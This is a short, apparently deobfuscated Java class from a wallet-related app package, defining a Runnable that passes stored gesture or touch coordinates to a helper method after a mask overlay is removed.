package com.guard.wallet.helper;

import com.guard.wallet.entity.Point;

/**
 * 遮罩移除延迟任务 — 执行手势/触摸坐标的分发。
 *
 * vendor 原名: com.guard.wallet.helper.h
 */
public final class BlockViewRemoveTask implements Runnable {
    public final int a;
    public final long b;
    public final Point[] c;

    public BlockViewRemoveTask(int a, long b, Point[] c) {
        this.a = a;
        this.b = b;
        this.c = c;
    }

    @Override
    public final void run() {
        com.guard.wallet.utils.SystemHelper.S(10L, b, c);
    }
}
